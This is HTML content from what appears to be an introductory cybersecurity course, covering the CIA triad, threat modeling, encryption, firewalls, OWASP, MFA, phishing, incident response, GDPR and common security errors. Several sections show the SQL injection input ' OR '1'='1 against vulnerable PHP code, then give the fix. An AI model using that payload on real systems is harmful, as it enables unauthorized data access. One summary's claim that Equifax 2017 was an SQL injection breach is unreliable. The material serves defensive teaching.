`
<div class="did-you-know">💡 <strong>Did you know?</strong> 95% of security breaches start with human error — not sophisticated zero-days. The human factor is the biggest vulnerability in any organization.</div>

<div class="section-title">CIA Triad — three pillars of security</div>
<p class="prose">Every security decision is measured against three values: Confidentiality, Integrity, and Availability. They often conflict with each other.</p>
<div class="grid-3">
<div class="card"><div class="card-icon">🔒</div><div class="card-title">Confidentiality</div><div class="card-body">Only authorized users can access data. Encryption, access control, need-to-know. Example: medical, financial records.</div></div>
<div class="card"><div class="card-icon">✅</div><div class="card-title">Integrity</div><div class="card-body">Data wasn't modified without authorization. Hashing, digital signatures, audit logs. Example: signed software update.</div></div>
<div class="card"><div class="card-icon">⚡</div><div class="card-title">Availability</div><div class="card-body">System is available to authorized users when needed. Redundancy, DDoS protection, backups. Example: hospital 24/7.</div></div>
</div>
<div class="callout callout-warn"><strong>⚠️ The built-in tension:</strong> Maximum security hurts availability. Locking everything down = secure, but nobody can work. Every security policy balances the three.</div>

<div class="section-title">Threat Modeling — think like an attacker</div>
<p class="prose">Before defending, understand what you're defending. STRIDE is Microsoft's threat identification model:</p>
<div class="table-wrap"><table class="data-table"><thead><tr><th>Threat</th><th>Meaning</th><th>Example</th><th>Defense</th></tr></thead><tbody>
<tr><td><strong>S</strong>poofing</td><td>Impersonation</td><td>Email phishing</td><td>MFA, SPF/DKIM</td></tr>
<tr><td><strong>T</strong>ampering</td><td>Data modification</td><td>Man-in-the-Middle</td><td>HTTPS, signing</td></tr>
<tr><td><strong>R</strong>epudiation</td><td>Denying action</td><td>"I didn't send that"</td><td>Audit logs, timestamps</td></tr>
<tr><td><strong>I</strong>nformation Disclosure</td><td>Data exposure</td><td>Data breach</td><td>Encryption, ACL</td></tr>
<tr><td><strong>D</strong>enial of Service</td><td>Disruption</td><td>DDoS attack</td><td>Rate limiting, CDN</td></tr>
<tr><td><strong>E</strong>levation of Privilege</td><td>Privilege escalation</td><td>sudo exploit</td><td>Least privilege</td></tr>
</tbody></table></div>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: Colonial Pipeline — May 2021</div>
  <div class="incident-body">
    Colonial Pipeline — the largest fuel pipeline in the US — was shut down by ransomware. Initial access: an old VPN account with a leaked password, no MFA. $5.5 million ransom paid.<br><br>
    <strong>Lessons:</strong> (1) MFA on every VPN — mandatory. (2) Unused old accounts — delete them. (3) Network segmentation — IT and OT (operational technology) should never communicate directly.
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> When you send a WhatsApp message, it's encrypted with the Signal protocol. WhatsApp itself cannot read your messages. That's End-to-End Encryption — even the company that built the app has no access to your content.</div>

<div class="section-title">Symmetric Encryption — one key</div>
<p class="prose">AES (Advanced Encryption Standard) is the symmetric standard. Same key encrypts and decrypts. Fast and efficient, but requires pre-shared key distribution.</p>
<div class="grid-2">
<div class="card"><div class="card-icon">🔑</div><div class="card-title">AES-256</div><div class="card-body">128-bit block, 256-bit key. Used in TLS, BitLocker, encrypted ZIP. <strong>Very fast in hardware.</strong> NSA approves for CLASSIFIED TOP SECRET.</div></div>
<div class="card"><div class="card-icon">⚡</div><div class="card-title">Modes of Operation</div><div class="card-body"><strong>ECB</strong> — insecure, patterns visible.<br><strong>CBC</strong> — good but not parallelizable.<br><strong>GCM</strong> — recommended: fast + Authenticated Encryption.</div></div>
</div>

<div class="section-title">Hashing — one-way fingerprint</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>Algorithm</th><th>Output</th><th>Status</th><th>Use</th></tr></thead><tbody>
<tr><td>MD5</td><td>128 bit</td><td><span class="threat-badge badge-critical">Broken</span></td><td>Not for security at all</td></tr>
<tr><td>SHA-1</td><td>160 bit</td><td><span class="threat-badge badge-critical">Broken</span></td><td>Deprecated</td></tr>
<tr><td>SHA-256</td><td>256 bit</td><td><span class="threat-badge badge-low">Secure</span></td><td>Git, certificates</td></tr>
<tr><td>bcrypt</td><td>184 bit</td><td><span class="threat-badge badge-low">Secure</span></td><td>Passwords only</td></tr>
<tr><td>Argon2</td><td>variable</td><td><span class="threat-badge badge-low">Best</span></td><td>Passwords — recommended</td></tr>
</tbody></table></div>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: SHA-1 Collision — Google SHAttered (2017)</div>
  <div class="incident-body">
    In 2017, Google demonstrated that SHA-1 is completely broken: they created two different PDF files with the same SHA-1 hash. An attacker could create a malicious document with an identical hash to a legitimate one.<br><br>
    Chrome, Firefox, and CA/Browser Forum banned SHA-1 entirely. Cost: 6,500 CPU-years, 110 GPU-years — feasible for well-funded adversaries.
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> When you connect to a coffee shop WiFi, all your traffic passes through their router. Without HTTPS and VPN, the shop owner (or anyone connected to the same network) can see everything you're doing.</div>

<div class="section-title">Firewalls — network guardians</div>
<div class="grid-2">
<div class="card"><div class="card-icon">🔥</div><div class="card-title">Stateless Firewall</div><div class="card-body">Inspects each packet by IP/Port independently. Fast, but no context. Doesn't detect: port scanning, IP spoofing, fragmented packets.</div></div>
<div class="card"><div class="card-icon">🧠</div><div class="card-title">Stateful Firewall</div><div class="card-body">Tracks connections. Knows that ACK without prior SYN = suspicious. The vast majority of modern firewalls.</div></div>
<div class="card"><div class="card-icon">🔍</div><div class="card-title">NGFW / WAF</div><div class="card-body">Deep Packet Inspection, Application Awareness, built-in IPS, SSL Inspection. WAF protects specifically web applications.</div></div>
<div class="card"><div class="card-icon">🕵️</div><div class="card-title">IDS vs IPS</div><div class="card-body"><strong>IDS</strong> = Intrusion Detection — detects and alerts.<br><strong>IPS</strong> = Intrusion Prevention — detects <em>and blocks</em>. Inline IPS can block legitimate traffic.</div></div>
</div>

<div class="section-title">Zero Trust — "never trust, always verify"</div>
<p class="prose">Old model: "everything inside the network is safe." Zero Trust: <strong>trust nobody, inside or outside the network</strong>, without explicit authentication and authorization.</p>
<div class="flow-row">
  <div class="flow-step"><div class="flow-step-icon">👤</div><div class="flow-step-label">Verify Identity<br>MFA always</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">📱</div><div class="flow-step-label">Check Device<br>Health, MDM</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">🔐</div><div class="flow-step-label">Least Privilege<br>minimum access</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">📊</div><div class="flow-step-label">Monitor All<br>Continuous</div></div>
</div>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: SolarWinds Supply Chain Attack — 2020</div>
  <div class="incident-body">
    Russian hackers (APT29/Cozy Bear) infiltrated SolarWinds and planted a backdoor in the Orion software update. 18,000 organizations installed the infected update, including Microsoft, Intel, CISA, and the Treasury Department.<br><br>
    <strong>Why Zero Trust would have helped:</strong> The backdoor created lateral movement inside the network — with Zero Trust and micro-segmentation, that movement between systems would have been blocked and immediately detected.
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> The OWASP Top 10 costs about $3 billion in damages annually. SQL Injection — discovered in 1998 — is still in the Top 10. The oldest vulnerability in the book is still relevant in 2024.</div>

<div class="section-title">OWASP Top 10 — 2021</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>#</th><th>Category</th><th>Severity</th><th>Example</th></tr></thead><tbody>
<tr><td>A01</td><td>Broken Access Control</td><td><span class="threat-badge badge-critical">Critical</span></td><td>Accessing another user's profile</td></tr>
<tr><td>A02</td><td>Cryptographic Failures</td><td><span class="threat-badge badge-critical">Critical</span></td><td>HTTP instead of HTTPS, MD5 for passwords</td></tr>
<tr><td>A03</td><td>Injection (SQL, XSS)</td><td><span class="threat-badge badge-critical">Critical</span></td><td>SELECT * FROM users WHERE id='$id'</td></tr>
<tr><td>A04</td><td>Insecure Design</td><td><span class="threat-badge badge-high">High</span></td><td>No rate limiting on login</td></tr>
<tr><td>A05</td><td>Security Misconfiguration</td><td><span class="threat-badge badge-high">High</span></td><td>Admin panel open to the internet</td></tr>
</tbody></table></div>

<div class="section-title">SQL Injection — the classic vulnerability</div>
<pre class="code-block"><code><span class="comment"># Vulnerable code (PHP)</span>
$query = "SELECT * FROM users WHERE user='" . $_GET['user'] . "'";

<span class="comment"># Attacker sends: ' OR '1'='1</span>
<span class="comment"># Query becomes:</span>
SELECT * FROM users WHERE user='' <span class="key">OR '1'='1'</span>
<span class="comment"># Result: all users returned!</span>

<span class="comment"># ✅ Fix: Parameterized Queries</span>
$stmt = $pdo->prepare("SELECT * FROM users WHERE user = <span class="val">?</span>");
$stmt->execute([$_GET['user']]);
<span class="comment"># Input treated as data, not SQL code</span></code></pre>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: British Airways — 2018, 500K credit cards</div>
  <div class="incident-body">
    The Magecart group planted a malicious script on British Airways' payment page that filtered payment data to an external server. The breach: changing 22 lines of JavaScript. The script ran for 2 weeks before detection.<br><br>
    <strong>What would have prevented it:</strong> Content-Security-Policy (CSP) blocking scripts from unauthorized sources. Subresource Integrity (SRI) to verify third-party scripts. BA received a £183M GDPR fine.
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> When you log into Spotify with your Google account, Google doesn't tell Spotify your password. It sends an encrypted "voucher" saying "I confirm this user is legitimate." That's OAuth 2.0 — the protocol running most "Login with Google/Facebook" in the world.</div>

<div class="section-title">Authentication vs Authorization</div>
<div class="grid-2">
<div class="card"><div class="card-icon">🪪</div><div class="card-title">Authentication — who are you?</div><div class="card-body">Identity verification: password, biometrics, certificate. <strong>Something you know, have, or are.</strong></div></div>
<div class="card"><div class="card-icon">🔐</div><div class="card-title">Authorization — what can you do?</div><div class="card-body">Permissions after identification. RBAC, ABAC, ACL. "Admin sees all, User sees only their own."</div></div>
</div>

<div class="section-title">MFA Strength Comparison</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>Factor</th><th>Example</th><th>Strength</th><th>Weakness</th></tr></thead><tbody>
<tr><td>SMS OTP</td><td>Code via SMS</td><td><span class="threat-badge badge-medium">Medium</span></td><td>SIM swapping, SS7 attack</td></tr>
<tr><td>TOTP App</td><td>Google Authenticator</td><td><span class="threat-badge badge-low">Good</span></td><td>Real-time phishing</td></tr>
<tr><td>Hardware Key</td><td>YubiKey, FIDO2</td><td><span class="threat-badge badge-low">Excellent</span></td><td>Cost, physical loss</td></tr>
<tr><td>Passkey</td><td>Face ID, biometric</td><td><span class="threat-badge badge-low">Excellent</span></td><td>New, partial support</td></tr>
</tbody></table></div>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: Okta Breach — 2023</div>
  <div class="incident-body">
    Identity provider Okta — used for SSO at thousands of companies — suffered a breach that exposed customer data including BeyondTrust, Cloudflare, and 1Password. Access: a support ticket system that had access to production systems.<br><br>
    <strong>Lesson:</strong> Identity providers are "keys to the kingdom" — compromising them means access to all customers. Zero Trust, minimum permissions for support systems, and multi-party approval for sensitive operations are essential.
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> 91% of cyber attacks start with a phishing email. The best antivirus in the world doesn't protect an employee who clicks a link in an email that looks like it's from their manager.</div>

<div class="section-title">Phishing — from email to breach</div>
<div class="grid-2">
<div class="card"><div class="card-icon">🎣</div><div class="card-title">Regular Phishing</div><div class="card-body">Mass emails in large volumes. "Your bank was hacked, click here." Low effort, low success rate.</div></div>
<div class="card"><div class="card-icon">🎯</div><div class="card-title">Spear Phishing</div><div class="card-body">Targeted at a specific person. Name, role, personal details. "Hi Ariel, I saw you're in R&D..." Much higher success rate.</div></div>
<div class="card"><div class="card-icon">🐳</div><div class="card-title">Whaling</div><div class="card-body">Spear phishing against C-level executives. CEO Fraud: "I'm the CFO, need an urgent $2M transfer."</div></div>
<div class="card"><div class="card-icon">📞</div><div class="card-title">Vishing / Smishing</div><div class="card-body">Voice phishing (phone) and SMS phishing. "I'm from IT, need your password for an urgent reset."</div></div>
</div>

<div class="callout callout-danger"><strong>🚨 Double Extortion:</strong> Groups like LockBit and REvil don't just encrypt — they also steal data and threaten to publish it if you don't pay. A good backup protects from encryption, but not from publication.</div>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: WannaCry — May 2017, 200,000 machines in 150 countries</div>
  <div class="incident-body">
    WannaCry used EternalBlue — a leaked NSA exploit — targeting an SMBv1 vulnerability in Windows. NHS (UK) was hit: thousands of surgeries cancelled, £92M in damage. Renault stopped production lines. FedEx lost $300M.<br><br>
    <strong>The vulnerability:</strong> Microsoft released a patch 2 months before the attack. Organizations that didn't update — got hit. <strong>Patch management = the most important protection.</strong>
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> The average MTTR (Mean Time To Respond) to a security breach is 207 days to detect and another 73 days to contain — 280 days total. An attacker can sit in your network for 9 months before being discovered.</div>

<div class="section-title">NIST Incident Response Framework</div>
<div class="flow-row">
  <div class="flow-step"><div class="flow-step-icon">🔍</div><div class="flow-step-label">Preparation<br>Plan ahead</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">🚨</div><div class="flow-step-label">Detection<br>Identify incident</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">Containment<br>Isolate immediately</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">🧹</div><div class="flow-step-label">Eradication<br>Full cleanup</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">🔄</div><div class="flow-step-label">Recovery<br>Restore operations</div></div>
  <div class="flow-arrow">→</div>
  <div class="flow-step"><div class="flow-step-icon">📝</div><div class="flow-step-label">Lessons Learned</div></div>
</div>

<div class="callout callout-warn"><strong>⚠️ Order of Volatility — preserve evidence in this order:</strong> CPU registers → Network connections → Running processes → RAM → Disk → Logs. Always preserve volatile data first — it disappears on reboot.</div>

<pre class="code-block"><code><span class="comment"># Linux forensics — first response commands</span>
date                          <span class="comment"># timestamp of investigation</span>
w && who                      <span class="comment"># who is logged in NOW</span>
ps auxf                       <span class="comment"># all running processes</span>
netstat -tulnap               <span class="comment"># open connections</span>
find / -mtime -1 -type f 2>/dev/null <span class="comment"># files changed 24h</span>
last && lastb                 <span class="comment"># login history + failures</span></code></pre>

<div class="incident-box">
  <div class="incident-title">🔥 Real Incident: Equifax — 2017, 147M Americans</div>
  <div class="incident-body">
    Equifax discovered the breach on July 29, 2017, but attackers had been inside since May 13 — 76 days of lateral movement, gradually stealing data. Why it wasn't detected: SSL inspection wasn't enabled, so encrypted traffic with an expired certificate wasn't inspected.<br><br>
    <strong>IR lessons:</strong> (1) Monitor outbound traffic for volume anomalies. (2) Enable SSL inspection. (3) Network segmentation — a DB with 147M people shouldn't be accessible from the web tier.
  </div>
</div>
<div class="ch-end-nav"><button class="ch-end-btn" onclick="showTab(CHID,'game')"><span class="ch-end-btn-icon">🎮</span><span class="ch-end-btn-label">Game</span></button><button class="ch-end-btn primary" onclick="showNextChapter(CHID)"><span class="ch-end-btn-icon">▶</span><span class="ch-end-btn-label">Next Chapter</span></button><button class="ch-end-btn" onclick="showTab(CHID,'cheat')"><span class="ch-end-btn-icon">📋</span><span class="ch-end-btn-label">Summary</span></button></div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> GDPR has imposed fines of over €4 billion since 2018. The largest: Meta — €1.2 billion in 2023. Security is no longer just a technical matter — it's direct business exposure.</div>

<div class="section-title">GDPR — what every organization must know</div>
<div class="grid-2">
<div class="card"><div class="card-icon">⏱️</div><div class="card-title">72 Hours</div><div class="card-body">Mandatory breach notification to regulators within 72 hours of discovery. If data subjects are affected — notify them too.</div></div>
<div class="card"><div class="card-icon">🗑️</div><div class="card-title">Right to Erasure</div><div class="card-body">Anyone can request deletion of all their data. "The right to be forgotten." Technical challenge: backups, logs, replicas.</div></div>
<div class="card"><div class="card-icon">💰</div><div class="card-title">Fines</div><div class="card-body">Up to 4% of global annual turnover, or €20M — whichever is higher. Not less than a regular operational fine.</div></div>
<div class="card"><div class="card-icon">📋</div><div class="card-title">DPIA</div><div class="card-body">Data Protection Impact Assessment — risk assessment before processing high-risk data. E.g., facial recognition, health data.</div></div>
</div>

<div class="section-title">Risk Management Strategies</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>Strategy</th><th>Meaning</th><th>When?</th><th>Example</th></tr></thead><tbody>
<tr><td><strong>Mitigate</strong></td><td>Reduce the risk</td><td>When cost is justified</td><td>Implementing MFA</td></tr>
<tr><td><strong>Transfer</strong></td><td>Transfer the risk</td><td>Cyber insurance</td><td>Cyber Insurance policy</td></tr>
<tr><td><strong>Accept</strong></td><td>Accept the risk</td><td>Defense cost > damage</td><td>Small legacy system</td></tr>
<tr><td><strong>Avoid</strong></td><td>Avoid the risk</td><td>Risk is too high</td><td>Don't store CC numbers</td></tr>
</tbody></table></div>

`<div class="did-you-know">💡 <strong>Did you know?</strong> Most security errors regular users encounter are not bugs — the system is doing exactly what it is supposed to do: protecting you. The famous SSH warning does not mean something broke. It means something suspicious may be happening and you should stop and think before proceeding.</div>

<div class="section-title">SSH — Warning: Remote Host Identification Has Changed</div>
<p class="prose">This is one of the most alarming messages a developer can see. You open a terminal, type ssh to server.com, and get a full block with a warning about a possible MITM attack. What is actually happening?</p>
<p class="prose">The first time you connected to this server, SSH saved a fingerprint of the server in the known_hosts file. Now the server presents a different fingerprint — and SSH refuses to continue to protect you from a Man-in-the-Middle attack: a situation where an attacker on your network impersonates the server and listens to everything you send.</p>
<pre class="code-block"><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (MITM attack)
Offending RSA key in ~/.ssh/known_hosts:5
Host key verification failed.</code></pre>

<div class="grid-2">
<div class="card"><div class="card-icon">🚨</div><div class="card-title">When is it a real threat?</div><div class="card-body">An attacker on your network is impersonating the server. They intercept your connection and present a fake key. If you proceed — everything you type (including passwords) passes through them. This is a classic MITM attack.</div></div>
<div class="card"><div class="card-icon">✅</div><div class="card-title">When is it completely legitimate?</div><div class="card-body">The server was reinstalled. The IP moved to a different server. The admin intentionally rotated keys. AWS/GCP/Azure replaced an instance. In all these cases the fingerprint changes for a technical reason, not because there is an attacker.</div></div>
</div>

<p class="prose"><strong>How to decide?</strong> Ask the server admin: "Did you do anything recently that could change the host key?" If yes — safe to proceed after removing the old record. If no — do not proceed and report to your security team.</p>
<pre class="code-block"><code><span class="comment"># Fix: remove the old record from known_hosts</span>
ssh-keygen -R server.com
<span class="comment"># Or manually edit ~/.ssh/known_hosts and delete line 5</span>

<span class="comment"># Then reconnect and verify the fingerprint matches</span>
ssh user@server.com</code></pre>

<div class="section-title">SSL/TLS Certificate Errors — "Your connection is not private"</div>
<p class="prose">The browser shows a red screen with NET::ERR_CERT_AUTHORITY_INVALID. The browser is protecting you. But not every certificate error is an attack — and it matters which error code you are looking at before deciding whether to click through (some errors correctly prevent clicking through entirely).</p>
<div class="table-wrap"><table class="data-table"><thead><tr><th>Error Code</th><th>Meaning</th><th>Common Cause</th><th>What to do</th></tr></thead><tbody>
<tr><td><code>ERR_CERT_AUTHORITY_INVALID</code></td><td>CA not recognized</td><td>Self-signed cert, corporate proxy</td><td>Check with IT — may need to install org CA cert</td></tr>
<tr><td><code>ERR_CERT_DATE_INVALID</code></td><td>Certificate expired</td><td>Server failed to renew Let's Encrypt</td><td>Wait for server fix — do not proceed</td></tr>
<tr><td><code>ERR_CERT_COMMON_NAME_INVALID</code></td><td>Domain mismatch</td><td>Certificate for a different domain</td><td>Verify URL is correct — possible phishing site</td></tr>
<tr><td><code>ERR_CERT_REVOKED</code></td><td>Certificate revoked</td><td>Certificate was stolen and emergency-revoked</td><td><strong>Do not proceed under any circumstances</strong></td></tr>
</tbody></table></div>

<div class="section-title">403 vs 401 — Not the Same Thing</div>
<div class="grid-2">
<div class="card"><div class="card-icon">🔐</div><div class="card-title">401 Unauthorized — "We do not know who you are"</div><div class="card-body">No credentials provided, or they are wrong. Solution: log in with a valid account. Whether you would be allowed in after login is still unknown at this point.</div></div>
<div class="card"><div class="card-icon">🚫</div><div class="card-title">403 Forbidden — "We know you, but no"</div><div class="card-body">The system knows your identity and denies access. Logging in again will not help. You need different permissions. Commonly confuses devs who keep retrying the login.</div></div>
</div>

<div class="section-title">CORS Error — Browser Error, Not Server Error</div>
<pre class="code-block"><code><span class="comment"># CORS is enforced by the browser — cannot be fixed client-side</span>

<span class="comment"># Fix: add headers on the SERVER side</span>
Access-Control-Allow-Origin: https://your-frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization

<span class="comment"># In local dev: use a proxy in Vite</span>
<span class="comment"># vite.config.js: server.proxy = { '/api': 'http://localhost:8000' }</span></code></pre>

<div class="section-title">JWT Errors</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>Error</th><th>Meaning</th><th>Fix</th></tr></thead><tbody>
<tr><td><code>TokenExpiredError</code></td><td>Token is too old</td><td>Use refresh token to get a new access token</td></tr>
<tr><td><code>invalid signature</code></td><td>Signed with different secret</td><td>Ensure JWT_SECRET is identical across all servers</td></tr>
<tr><td><code>jwt malformed</code></td><td>Token is corrupted or incomplete</td><td>Check header is complete: Authorization: Bearer &lt;token&gt;</td></tr>
<tr><td><code>NotBeforeError</code></td><td>Token not yet valid (nbf)</td><td>Server clock not synced — configure NTP</td></tr>
</tbody></table></div>

`<div class="sum-block"><div class="sum-block-title">🛡️ Intro — What is Cybersecurity and Why It Matters</div>
<div class="sum-row"><span class="sum-k">CIA Triad — three pillars</span><span class="sum-v"><strong>Confidentiality</strong>: only those who need it can see the data. Your medical records? Only your doctor. <strong>Integrity</strong>: data isn't changed without notice. Bank transfer? Must arrive exactly as sent. <strong>Availability</strong>: systems work when needed. Hospital hit by ransomware? Availability breached — lives at risk. Every attack in the world targets one of these three.</span></div>
<div class="sum-row"><span class="sum-k">Threat vs Vulnerability vs Risk</span><span class="sum-v"><strong>Threat</strong> = the danger: hacker, ransomware, disgruntled employee. <strong>Vulnerability</strong> = the weakness that enables it: weak password, unpatched software, user who clicks links. <strong>Risk</strong> = Threat × Vulnerability × Impact. No vulnerability — no risk. Security = closing weaknesses before the Threat arrives.</span></div>
<div class="sum-row"><span class="sum-k">Defense in Depth</span><span class="sum-v">Don't rely on one protection layer. Like a castle: moat → wall → guards → inner vaults. One layer breached? Inner layers still protect. In IT: Firewall → MFA → Encryption → Monitoring → Incident Response. Colonial Pipeline 2021 was breached because VPN had <strong>no MFA</strong> — one missing layer = entire pipeline offline.</span></div>

`<div class="sum-block"><div class="sum-block-title">🔐 Encryption — How to Hide Information</div>
<div class="sum-row"><span class="sum-k">Symmetric — one key for two</span><span class="sum-v">Like a <strong>regular door lock</strong>: the same key locks and unlocks. Very fast. Problem: how do you safely send the key to the other party? If you sent it over the network and someone intercepted it — everything is exposed. <strong>AES</strong> is the standard: AES-256 is so strong that a regular computer would need trillions of years to break it.</span></div>
<div class="sum-row"><span class="sum-k">Asymmetric — two keys</span><span class="sum-v">The solution to the key exchange problem: <strong>Public key</strong> (shared with everyone) + <strong>Private key</strong> (kept secret). What's encrypted with the public key — only the private key can open. Like a mailbox with a slot: anyone can drop something in, only the owner can open and take. RSA, ECC — foundation of HTTPS, SSH, digital signatures.</span></div>
<div class="sum-row"><span class="sum-k">Hash — digital fingerprint</span><span class="sum-v">One-way function: any input → fixed-size fingerprint. "Hello" → SHA256 → "185f8db...". Change one letter → completely different fingerprint. <strong>Cannot be reversed</strong> — even knowing the hash doesn't tell you the input. Used for: password verification, file integrity, digital signatures. <strong>MD5/SHA1 are broken</strong> — can be forged. Don't use them.</span></div>
<div class="sum-row"><span class="sum-k">Diffie-Hellman — mathematical magic</span><span class="sum-v">Two people reach a <strong>shared secret without the secret ever crossing the network</strong>. Like mixing colors: Alice and Bob start with the same color (public), each adds their own secret color, exchange results, add their secret again — and arrive at the same final color. ECDHE: the modern fast version. Foundation of TLS, meaning HTTPS.</span></div>
<div class="sum-row"><span class="sum-k">Perfect Forward Secrecy</span><span class="sum-v">Without PFS: if a server is breached today and private key stolen — <strong>all HTTPS from the past year</strong> that was recorded can be decrypted. With PFS: each session gets a new key immediately deleted. Stealing the private key = access to the future only. TLS 1.3 mandates PFS — old RSA (no PFS) was completely removed.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">🔥 Firewalls & VPN — Guarding the Borders</div>
<div class="sum-row"><span class="sum-k">What is a Firewall?</span><span class="sum-v">Like a <strong>security guard at the entrance</strong>: checks every packet trying to enter or leave. Allows: "port 443 = HTTPS = permitted". Blocks: "port 22 from unknown IP = suspicious SSH = blocked". Stateful firewall: remembers connections — allows replies to requests that were sent, blocks connections that didn't start from inside.</span></div>
<div class="sum-row"><span class="sum-k">WAF — Web Application Firewall</span><span class="sum-v">"Smart" firewall that understands HTTP. Regular firewall: "port 443 = allowed". WAF: "this request contains <code>' OR '1'='1</code> — that's SQL injection — block!" Protects from SQLi, XSS, CSRF, even when the application itself is vulnerable. Cloudflare WAF, AWS WAF, ModSecurity. <strong>Not a replacement for secure code</strong> — an additional layer.</span></div>

<div class="sum-row"><span class="sum-k">VPN — encrypted tunnel</span><span class="sum-v">On public WiFi — the ISP/network operator sees every request you make. VPN creates an <strong>encrypted tunnel</strong> between you and the VPN server: the public WiFi only sees gibberish. For companies: VPN = secure access to the corporate network from home. WireGuard: the modern protocol, 4,000 lines of code vs 100K in OpenVPN — simpler, faster.</span></div>

`<div class="sum-block"><div class="sum-block-title">🌐 Web Security — The Ten Most Common Threats</div>
<div class="sum-row"><span class="sum-k">SQL Injection — manipulating the database</span><span class="sum-v">Site asks DB: "give me the user with username='<strong>USER_INPUT</strong>'". Attacker types: <code>' OR '1'='1</code>. The query becomes: "WHERE username='' OR '1'='1'" — <strong>always true</strong>, returns all users. Fix: <strong>Prepared Statements</strong> — separates SQL code from data. Equifax 2017: SQLi → 147 million Americans exposed. $575M in fines.</span></div>

`<div class="sum-block"><div class="sum-block-title">🔑 Identity & Access — Who You Are and What You're Allowed</div>
<div class="sum-row"><span class="sum-k">Password Hashing — why not store passwords</span><span class="sum-v">If DB is stolen with plaintext passwords — every account is immediately exposed. Hash = one-way fingerprint. Store: Hash(password). Login: Hash(input) = stored hash? Yes → login. Stolen hash is useless without knowing the source. <strong>bcrypt/Argon2</strong>: intentionally slow — brute force takes years. <strong>Salt</strong>: prevents Rainbow Tables — same password gives different hash for each user.</span></div>

